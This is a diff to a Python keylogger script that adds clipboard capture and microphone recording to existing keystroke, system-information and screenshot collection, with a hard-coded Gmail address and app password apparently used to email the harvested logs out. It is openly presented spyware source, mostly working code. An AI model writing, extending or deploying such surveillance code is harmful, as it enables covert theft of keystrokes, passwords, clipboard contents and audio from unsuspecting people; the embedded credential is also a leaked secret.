@@ -37,6 +37,8 @@ from PIL import ImageGrab  # screenshot library
 
 keys_information = "key_log.txt"
 system_information = "system_info.txt"
+clipboard_information = "clipboard_info.txt"
+microphone_time = 10  # time in seconds
 email_address = "trashkeylogger@gmail.com"  # trash email address
 password = "fyylgrzcjqftecbt"
 toaddr = "trashkeylogger@gmail.com"
@@ -102,6 +104,30 @@ def computer_information():
 
 
 computer_information()
+
+# getting Clipboard Information
+
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()  # open the clipboard
+            pasted_data = win32clipboard.GetClipboardData()  # get the clipboard data
+            win32clipboard.CloseClipboard()  # close the clipboard
+        except:
+            f.write("Clipboard could not be copied")
+
+
+copy_clipboard()
+
+
+# getting Audio Information
+
+def microphone():
+    fs = 44100  # sample frequency rate
+    seconds = microphone_time
+
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
 
 
 # Key Logger Functionality
